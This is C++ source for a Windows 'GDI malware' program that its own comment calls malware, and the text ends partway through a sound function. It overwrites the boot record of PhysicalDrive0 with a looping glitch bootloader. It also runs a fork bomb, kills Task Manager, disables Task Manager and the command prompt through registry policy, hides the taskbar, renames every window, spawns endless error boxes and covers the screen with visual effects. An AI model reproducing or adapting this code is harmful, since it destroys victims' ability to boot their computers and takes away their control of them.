#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <tchar.h>
#include <cmath>
#include <time.h>
#include <cmath>
#include <wingdi.h>
#include <vector>
#include <stdlib.h>
#include <gdiplus.h>
#include <complex>

#define sleep Sleep
#define tuff 67
#define block 10
#define BLOCK_SIZE 100

using namespace Gdiplus;

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = fmax(fmax(_r, _g), _b);
		FLOAT rgbMax = fmax(fmax(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta); // BOI IS TS TUFF IN C++?
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF GetColor(int iterations, int maxIter) {
    if (iterations == maxIter) return RGB(0, 0, 0);
    return RGB((iterations * 9) % 256, (iterations * 2) % 256, (iterations * 5) % 256);
}
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

void mbr()
{
    unsigned char MasterBootRecord[512] = {
        0xFA,                               // cli
        0x31, 0xC0,                         // xor ax, ax
        0x8E, 0xD0,                         // mov ss, ax
        0xBC, 0x00, 0x7C,                   // mov sp, 0x7C00
        0x8E, 0xC0,                         // mov es, ax
        0x8E, 0xD8,                         // mov ds, ax

        0xB8, 0x03, 0x00,                   // mov ax, 0x0003 (text mode)
        0xCD, 0x10,                         // int 10h

        // Small wait loop (~fake delay)
        0xB9, 0xFF, 0xFF,                   // mov cx, 0xFFFF
        0xE2, 0xFE,                         // loop $

        // Set DS = 0xB800
        0xB8, 0x00, 0xB8,                   // mov ax, 0xB800
        0x8E, 0xD8,                         // mov ds, ax

                            // Set ES = 0xB800 (optional)
        0xB8, 0x00, 0xB8,                   // mov ax, 0xB800
        0x8E, 0xC0,                         // mov es, ax
        0x31, 0xFF,     // xor di, di (video memory offset)

        // Loop to animate glitch
        // We'll loop and change AX to different values

        // LABEL: loop_start
        0xB9, 0xF0, 0x03,                   // mov cx, 1008 (words to fill 80x25)

        // RANDOM CHAR 1 (█ red on black)
        0xB8, 0xDB, 0x4F,                   // mov ax, 0x4FDB
        0xF3, 0xAB,                         // rep stosw

        // Small pause
        0xB9, 0x10, 0x00,                   // mov cx, 0x0010
        0xE2, 0xFE,                         // loop $

        0x31, 0xFF,                         // xor di, di again
        0xB9, 0xF0, 0x03,                   // mov cx, 1008
        0xB8, 0xB0, 0x1F,                   // mov ax, 0x1FB0 (▒ blue on white)
        0xF3, 0xAB,                         // rep stosw

        // Delay
        0xB9, 0x08, 0x00,
        0xE2, 0xFE,

        0x31, 0xFF,
        0xB9, 0xF0, 0x03,
        0xB8, 0x23, 0x5E,                   // mov ax, 0x5E23 (# yellow)
        0xF3, 0xCD,

        // Delay
        0xB9, 0x08, 0x00,
        0xE2, 0xFE,

        // Infinite glitch loop
        0xEB, 0xD1                          // jmp short to first fill
    };

    // Pad with 0x00 up to 510
    for (int i = sizeof(MasterBootRecord); i < 510; i++) {
        MasterBootRecord[i] = 0x00;
    }

    // Boot signature
    MasterBootRecord[510] = 0x55;
    MasterBootRecord[511] = 0xAA;

    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice != INVALID_HANDLE_VALUE) {
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, NULL);
        CloseHandle(hDevice);
    } else {
        MessageBoxA(0, "Failed to write MBR.", "Error", 0);
    }
}

#define NUM_VERTICES 16
#define NUM_EDGES 32
#define PI 3.14159265

struct Vec4 { float x, y, z, w; };
struct Vec2 { int x, y; };

Vec4 vertices[NUM_VERTICES];
Vec2 projected[NUM_VERTICES];

int edges[NUM_EDGES][2] = {
    {0,1},{1,3},{3,2},{2,0},
    {4,5},{5,7},{7,6},{6,4},
    {0,4},{1,5},{2,6},{3,7},
    {8,9},{9,11},{11,10},{10,8},
    {12,13},{13,15},{15,14},{14,12},
    {8,12},{9,13},{10,14},{11,15},
    {0,8},{1,9},{2,10},{3,11},
    {4,12},{5,13},{6,14},{7,15}
};

void initTesseract() {
    int i = 0;
    for (int x = -1; x <= 1; x += 2)
        for (int y = -1; y <= 1; y += 2)
            for (int z = -1; z <= 1; z += 2)
                for (int w = -1; w <= 1; w += 2)
                    vertices[i++] = { (float)x, (float)y, (float)z, (float)w };
}

Vec2 project4Dto2D(Vec4 v, float angle, int w, int h) {
    float a = angle;
    float s = sin(a), c = cos(a);

    // 4D rotations
    float x = v.x * c - v.w * s;
    float w4 = v.x * s + v.w * c;

    float y = v.y * c - w4 * s;
    w4 = v.y * s + w4 * c;

    float z = v.z * c - w4 * s;
    w4 = v.z * s + w4 * c;

    float d = 4;
    float factor = 1 / (d - w4);
    x *= factor;
    y *= factor;
    z *= factor;

    float scale = 150;
    int px = (int)(x * scale + w / 2);
    int py = (int)(y * scale + h / 2);

    return { px, py };
}

DWORD WINAPI forkbomb(LPVOID)
{
	while(true)
	{
	  system("start");
	  system("start");
	  sleep(1000);
	}
}

DWORD WINAPI tesseract(LPVOID)
{
    HWND hwnd = GetDesktopWindow();
    HDC screen = GetDC(hwnd);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, sw, sh);
    SelectObject(mem, bmp);

    initTesseract();

    float angle = 0.0f;
    float offsetX = sw / 2, offsetY = sh / 2;
    float velX = 3.5f, velY = 2.8f;

    while (true) {

        // Update position
        offsetX += velX;
        offsetY += velY;
        if (offsetX < 100 || offsetX > sw - 100) velX = -velX;
        if (offsetY < 100 || offsetY > sh - 100) velY = -velY;

        // Project vertices
        for (int i = 0; i < NUM_VERTICES; i++) {
            Vec2 p = project4Dto2D(vertices[i], angle, sw, sh);
            projected[i] = { p.x + (int)(offsetX - sw / 2), p.y + (int)(offsetY - sh / 2) };
        }

        // Draw edges
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(0, 255, 255));
        SelectObject(mem, pen);
        for (int i = 0; i < NUM_EDGES; i++) {
            MoveToEx(mem, projected[edges[i][0]].x, projected[edges[i][0]].y, NULL);
            LineTo(mem, projected[edges[i][1]].x, projected[edges[i][1]].y);
        }
        DeleteObject(pen);

        // Copy to screen
        BitBlt(screen, 0, 0, sw, sh, mem, 0, 0, SRCCOPY);

        angle += 0.05f;
        Sleep(16); // ~60 FPS
    }

    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(hwnd, screen);
    return 0;
}

DWORD WINAPI text(LPVOID lpParam) 
{
    const wchar_t* texts[5] = { L"Windows", L"System32", L"C:", L"dll.exe", L"TIME SPACE"};
    int index = 0;

    while (1) 
	{
        HWND hwnd = FindWindowEx(NULL, NULL, NULL, NULL);
        while (hwnd != NULL && 1) {
            SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)texts[index], SMTO_ABORTIFHUNG, 100, NULL);
            hwnd = FindWindowEx(NULL, hwnd, NULL, NULL);
        }

        index = (index + 1) % 5; // da cycle through 0, 1, 2
        Sleep(2);
    }

    return 0;
}

DWORD WINAPI msg(LPVOID lpParam)
{
	while (true)
	{
	 MessageBox(NULL, "%$%&&^&%^&%^&&%#^$%^%$%$^%$&%%*^&*()", "dll.exe sigma", MB_YESNO | MB_ICONERROR);
	 MessageBox(NULL, "???", "", E_ABORT | MB_ICONERROR);
	 sleep(100);
    }
}

DWORD WINAPI shader1(LPVOID lpParam)
{
    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h; // top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pPixels = nullptr;
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    SelectObject(hdcMem, hBitmap);

    int frame = 0;
    float t = 0.0f;

    while (true)
    {
        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                int index = y * w + x;
                bool inTriangle = ((x >> frame) & (y >> frame)) == 0;

                if (inTriangle)
                {
                    // Rainbow color cycle using sine wave
                    BYTE r = (BYTE)(128 + 127 * sin(t + x * 0.002));
                    BYTE g = (BYTE)(128 + 127 * sin(t + y * 0.002));
                    BYTE b = (BYTE)(128 + 127 * sin(t + (x + y) * 0.002));

                    pPixels[index].rgbRed = r;
                    pPixels[index].rgbGreen = g;
                    pPixels[index].rgbBlue = b;
                }
                else
                {
                    pPixels[index].rgbRed = 0;
                    pPixels[index].rgbGreen = 0;
                    pPixels[index].rgbBlue = 0;
                }
            }
        }

        hdcScreen = GetDC(NULL);
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);

        frame = 0;   // zoom cycle
        t += 0.1f;                 // color animation speed
        Sleep(10);                // adjust to taste
    }

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    return 0;
}

DWORD WINAPI shaki(LPVOID lpParam) 
{
    HDC hdc;
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    while (1) {
        hdc = GetDC(0);
        if (hdc == NULL) {
            break;
        }
        int xOffset = (rand() % 3) - 1;
        int yOffset = (rand() % 3) - 1;
        BitBlt(hdc, xOffset, yOffset, width, height, hdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(0.7);
    }
    return 0;
}

DWORD WINAPI textout(LPVOID lpvd)
{
    HFONT hFont = CreateFont(
        77, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_RASTER_PRECIS, CLIP_DEFAULT_PRECIS,
        NONANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN,
        "Terminal" 
    );
    const char* texts[] = { "WHY WHY WHY WHY", "I CANT DO IT", "?", "im scared.",  "WHY DID YOU DO THAT?"}; // texts!.
    int currentText = 0;
    DWORD lastSwitch = GetTickCount();

    while (true) {
        HDC hdc = GetDC(0);
        SelectObject(hdc, hFont);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkMode(hdc, TRANSPARENT);
        TextOutA(hdc, rand() % w, rand() % h, texts[currentText], lstrlenA(texts[currentText]));
        ReleaseDC(0, hdc);
        sleep(4);
        if (GetTickCount() - lastSwitch >= 600) 
		{
            currentText = (currentText + 1) % 5;
            lastSwitch = GetTickCount();
        }
    }
    DeleteObject(hFont);
    return 0;
}

DWORD WINAPI mash(LPVOID) 
{
    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC screen = GetDC(NULL);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    SelectObject(mem, bmp);

    srand(GetTickCount());

    float time = 0;

    while (true) {
        time += 0.05f;

        // Take fresh screenshot
        BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY);

        // 1. 🔀 Skew entire screen (PlgBlt)
        POINT plg[3];
        int skew = (int)(50 * sin(time));
        plg[0] = {0 + skew, 0};
        plg[1] = {w + skew, 0};
        plg[2] = {0 - skew, h};
        PlgBlt(screen, plg, mem, 0, 0, w, h, NULL, 0, 0);

        // 2. 💥 Mash screen into blocks
        for (int y = 0; y < h; y += BLOCK_SIZE) {
            for (int x = 0; x < w; x += BLOCK_SIZE) {
                int randX = (rand() % 3 - 1) * (BLOCK_SIZE / 2);
                int randY = (rand() % 3 - 1) * (BLOCK_SIZE / 2);
                int skewX = (rand() % 21) - 10;
                int skewY = (rand() % 21) - 10;

                POINT blit[3] = {
                    {x + skewX, y + skewY},
                    {x + BLOCK_SIZE + skewX, y - skewY},
                    {x - skewX, y + BLOCK_SIZE + skewY}
                };

                PlgBlt(screen, blit, mem, x, y, BLOCK_SIZE, BLOCK_SIZE, NULL, 0, 0);
            }
        }

        // 3. 🌈 Draw rainbow overlay
        for (int y = 0; y < h; y += 20) {
            float hue = fmodf(time + y * 0.01f, 1.0f);
            float r = fabs(sinf(6.2831f * hue));
            float g = fabs(sinf(6.2831f * (hue + 0.333f)));
            float b = fabs(sinf(6.2831f * (hue + 0.666f)));

            HBRUSH rainbow = CreateSolidBrush(RGB(r * 255, g * 255, b * 255));
            RECT rect = {0, y, w, y + 20};
            FillRect(mem, &rect, rainbow);
            DeleteObject(rainbow);
        }

        // 4. 🔵 Draw morphing shape (circle that changes)
        const int cx = w / 2;
        const int cy = h / 2;
        const int baseRadius = 150;
        int points = 60;
        POINT shape[128];

        for (int i = 0; i < points; ++i) {
            float angle = (2 * 3.14159f * i) / points;
            float wobble = 1.0f + 0.3f * sinf(time * 2 + i * 0.5f); // wobble effect
            int radius = baseRadius * wobble;

            shape[i].x = cx + (int)(cosf(angle) * radius);
            shape[i].y = cy + (int)(sinf(angle) * radius);
        }

        float hue = fmodf(time * 0.2f, 1.0f);
        float r = fabs(sinf(6.2831f * hue));
        float g = fabs(sinf(6.2831f * (hue + 0.333f)));
        float b = fabs(sinf(6.2831f * (hue + 0.666f)));
        HBRUSH shapeBrush = CreateSolidBrush(RGB(r * 255, g * 255, b * 255));
        SelectObject(mem, shapeBrush);
        Polygon(mem, shape, points);
        DeleteObject(shapeBrush);

        // Final paint
        BitBlt(screen, 0, 0, w, h, mem, 0, 0, SRCPAINT);

        Sleep(33); // ~30fps
    }

    // Never reached, but good practice
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, screen);
    return 0;
}

DWORD WINAPI Shape(LPVOID lpParam) 
{
    #define PI 3.14159265
    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdc = GetDC(NULL);
    int radius = 200;
    float angle = 0.0f;
    int shapeMode = 0;

    while (true) 
	{

        int cx = w / 2;
        int cy = h / 2;
        int sides = 3 + (shapeMode % 7); // From triangle to 9-gon

        std::vector<POINT> points;

        for (int i = 0; i < sides; i++) {
            float t = angle + i * 2 * PI / sides;
            float r = radius + 30 * sinf(t * 2); // shape distortion
            int x = cx + (int)(cosf(t) * r);
            int y = cy + (int)(sinf(t) * r);
            points.push_back({ x, y });
        }

        points.push_back(points[0]); // close the shape

        // Draw the polygon
        Polygon(hdc, points.data(), points.size());
        Sleep(30);
        angle += 0.05f;

        if ((int)(angle * 10) % 100 == 0) {
            shapeMode++; // Change shape every few frames
        }
    }

    ReleaseDC(NULL, hdc);
    return 0;
}

DWORD WINAPI inv(LPVOID lpParam) 
{
    HDC hdc;
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);

    // Create red and blue brushes
    HBRUSH red = CreateSolidBrush(RGB(255, 0, 0));
    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 255));

    int toggle = 0;

    while (1)
    {
        hdc = GetDC(0);

        // Alternate between red and blue
        HBRUSH current = (toggle % 2 == 0) ? red : blue;
        HBRUSH old = (HBRUSH)SelectObject(hdc, current);

        // Draw full-screen rectangle with current brush
        PatBlt(hdc, 0, 0, x, y, PATCOPY);

        SelectObject(hdc, old);
        ReleaseDC(0, hdc);

        toggle++;
        Sleep(100); // adjust speed if needed
    }
    DeleteObject(red);
    DeleteObject(blue);
    return 0;
}
DWORD WINAPI gitchwithrand(LPVOID lpParam) 
{
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HBRUSH red = CreateSolidBrush(RGB(255, 255, 0));
    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 255));

    int toggle = 0;

    while (1)
    {
        HDC hdc = GetDC(0);

        // Alternate red and blue background fill
        HBRUSH current = (toggle % 2 == 0) ? red : blue;
        HBRUSH old = (HBRUSH)SelectObject(hdc, current);
        PatBlt(hdc, 0, 0, w, h, PATCOPY);
        SelectObject(hdc, old);

        // Distortion pass
        for (int i = 0; i < 30; i++) 
		{
            int rx = rand() % w;
            int ry = rand() % h;
            int rw = 100 + rand() % 200;
            int rh = 5 + rand() % 30;
            int offset = (rand() % 2 ? -1 : 1) * (5 + rand() % 20); // shift left or right randomly

            BitBlt(hdc, rx + offset, ry, rw, rh, hdc, rx, ry, SRCCOPY);
        }

        ReleaseDC(0, hdc);
        toggle++;
        Sleep(100);
    }
    DeleteObject(red);
    DeleteObject(blue);

    return 0;
}

DWORD WINAPI icon4d(LPVOID) 
{
    const int sw = GetSystemMetrics(SM_CXSCREEN);
    const int sh = GetSystemMetrics(SM_CYSCREEN);
    const int count = 8;
    float x[count], y[count], z[count], w[count];
    float dx[count], dy[count], dz[count], dw[count];
    HICON icons[count];
    HDC hdc = GetDC(0);
    float t = 0;

    HICON base[4] = {
        LoadIcon(NULL, IDI_WARNING),
        LoadIcon(NULL, IDI_ERROR),
        LoadIcon(NULL, IDI_INFORMATION),
        LoadIcon(NULL, IDI_QUESTION)
    };
    for (int i = 0; i < count; i++) {
        x[i] = rand() % sw;
        y[i] = rand() % sh;
        z[i] = rand() % 1000 - 500;
        w[i] = rand() % 600 - 300;
        dx[i] = (rand() % 4 + 1) * ((rand() % 2) ? 1 : -1);
        dy[i] = (rand() % 4 + 1) * ((rand() % 2) ? 1 : -1);
        dz[i] = (rand() % 4 + 1) * ((rand() % 2) ? 1 : -1);
        dw[i] = (rand() % 4 + 1) * ((rand() % 2) ? 1 : -1);
        icons[i] = base[i % 4];
    }

    while (true) 
	{

        for (int i = 0; i < count; i++) {
            x[i] += dx[i]; if (x[i] < 0 || x[i] > sw) dx[i] *= -1;
            y[i] += dy[i]; if (y[i] < 0 || y[i] > sh) dy[i] *= -1;
            z[i] += dz[i]; if (z[i] < -500 || z[i] > 500) dz[i] *= -1;
            w[i] += dw[i]; if (w[i] < -300 || w[i] > 300) dw[i] *= -1;

            float scale = 1.5f + sinf(t + w[i] * 0.01f) * 0.5f;
            int ix = (int)(x[i] + cosf(t * 0.5f + z[i] * 0.01f) * w[i] * 0.002f);
            int iy = (int)(y[i] + sinf(t * 0.3f + w[i] * 0.01f) * w[i] * 0.002f);
            int size = (int)(64 * scale);

            DrawIconEx(hdc, ix, iy, icons[i], size, size, 0, NULL, DI_NORMAL);
        }

        t += 0.05f;
        Sleep(16);
    }

    return 0;
}


DWORD WINAPI circle(LPVOID)
{
    HDC hdc = GetDC(0);
    const int sw = GetSystemMetrics(SM_CXSCREEN);
    const int sh = GetSystemMetrics(SM_CYSCREEN);

    int radius = 100;
    int x = sw / 2;
    int y = sh / 2;
    int vx = 6;
    int vy = 4;

    while (true)
    {
        for (int i = radius; i > 0; --i)
        {
            int shade = 255 - (i * 255 / radius);
            HBRUSH brush = CreateSolidBrush(RGB(shade, shade, shade));
            SelectObject(hdc, brush);

            Ellipse(hdc,
                    x - i,
                    y - (int)(i * 0.9),
                    x + i,
                    y + (int)(i * 0.9));

            DeleteObject(brush);
        }
        x += vx;
        y += vy;

        if (x - radius < 0 || x + radius > sw) vx = -vx;
        if (y - radius < 0 || y + radius > sh) vy = -vy;

        Sleep(16);
    }

    ReleaseDC(0, hdc);
    return 0;
}


DWORD WINAPI ball(LPVOID lpParam) {
    const int screenW = GetSystemMetrics(SM_CXSCREEN);
    const int screenH = GetSystemMetrics(SM_CYSCREEN);
    const int count = 10;

    struct Circle {
        int x, y, dx, dy, r;
        COLORREF c;
    } ball[count];

    srand(GetTickCount());

    for (int i = 0; i < count; i++) {
        ball[i].r = rand() % 40 + 20;
        ball[i].x = rand() % (screenW - ball[i].r);
        ball[i].y = rand() % (screenH - ball[i].r);
        ball[i].dx = (rand() % 7) - 3; if (ball[i].dx == 0) ball[i].dx = 1;
        ball[i].dy = (rand() % 7) - 3; if (ball[i].dy == 0) ball[i].dy = 1;
        ball[i].c = RGB(rand() % 256, rand() % 256, rand() % 256);
    }

    HDC hdc = GetDC(NULL);
    HDC mem = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, screenW, screenH);
    SelectObject(mem, bmp);

    while (true) 
	{

        for (int i = 0; i < count; i++) {
            HBRUSH b = CreateSolidBrush(ball[i].c);
            SelectObject(mem, b);
            Ellipse(mem, ball[i].x, ball[i].y, ball[i].x + ball[i].r, ball[i].y + ball[i].r);
            DeleteObject(b);

            ball[i].x += ball[i].dx;
            ball[i].y += ball[i].dy;

            if (ball[i].x < 0 || ball[i].x + ball[i].r > screenW) ball[i].dx *= -1;
            if (ball[i].y < 0 || ball[i].y + ball[i].r > screenH) ball[i].dy *= -1;
        }

        BitBlt(hdc, 0, 0, screenW, screenH, mem, 0, 0, SRCCOPY);
        Sleep(16);
    }

    DeleteDC(mem);
    DeleteObject(bmp);
    ReleaseDC(NULL, hdc);
    return 0;
}

DWORD WINAPI Icons(LPVOID) 
{
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    while (true) 
	{
        for (int i = 0; i < 100 && true; i++) 
		{
            HICON hIcon = NULL;
            ExtractIconExA("moricons.dll", i, &hIcon, NULL, 1);
            if (hIcon) 
			{
                DrawIconEx(hdc, (screenWidth - 128) / 2, (screenHeight - 128) / 2, hIcon, 128, 128, 0, NULL, DI_NORMAL);
                DestroyIcon(hIcon);
            }
            Sleep(3);
        }
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

DWORD WINAPI shader2(LPVOID ipParam)
{
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(NULL);
    srand(static_cast<unsigned>(time(0)));

    while (1) 
	{
        for (int i = 0; i < 100; ++i) {
            int size = rand() % 100 + 20;

            int srcX = rand() % (screenWidth - size);
            int srcY = rand() % (screenHeight - size);
            int dstX = rand() % (screenWidth - size);
            int dstY = rand() % (screenHeight - size);

            BitBlt(hdcScreen, dstX, dstY, size, size, hdcScreen, srcX, srcY, NOTSRCCOPY);
        }

        Sleep(3);
    }

    ReleaseDC(NULL, hdcScreen);
    return 0;
}

DWORD WINAPI spin(LPVOID ipParam) // i love this effect yet its made by me
{
    HDC hScreenDC = GetDC(NULL);
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenW, screenH);
    SelectObject(hMemDC, hBitmap);

    int centerX = screenW / 2;
    int centerY = screenH / 2;

    float angle = 0.0f;

    while (1) 
	{
        BitBlt(hMemDC, 0, 0, screenW, screenH, hScreenDC, 0, 0, SRCCOPY);
        for (int y = 0; y < screenH; y += 40) {
            for (int x = 0; x < screenW; x += 40) {
                float dx = x - centerX;
                float dy = y - centerY;
                float distance = sqrt(dx * dx + dy * dy);
                float theta = atan2(dy, dx) + angle;

                int srcX = (int)(cos(theta) * distance + centerX);
                int srcY = (int)(sin(theta) * distance + centerY);
                if (srcX >= 0 && srcX < screenW && srcY >= 0 && srcY < screenH) 
				{
                    BitBlt(hScreenDC, x, y, 40, 40, hMemDC, srcX, srcY, NOTSRCCOPY);
                }
            }
        }

        angle += 0.03f;
        if (angle > 2 * PI) angle = 0;

        Sleep(24);
    }
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);

    return 0;
}

VOID WINAPI OHNONUKE()
{
	system("taskkill /F /IM taskmgr.exe");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f");
    system("reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableCMD /t REG_DWORD /d 1 /f");
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL); // by pankoza
	ShowWindow(hShellWnd, SW_HIDE);
}

VOID WINAPI sound0()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t+5*(42&t>>1) >> t/5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound1()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 4) * ((t & 4096 ? (t % 32768 & 45056 ? 6 : (t >> 10) & 3) : 12) + ((t >> 13) & 1)) >> ((t >> 9) & 3) + ((t >> 7) & 3) + ((t >> 3) & 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
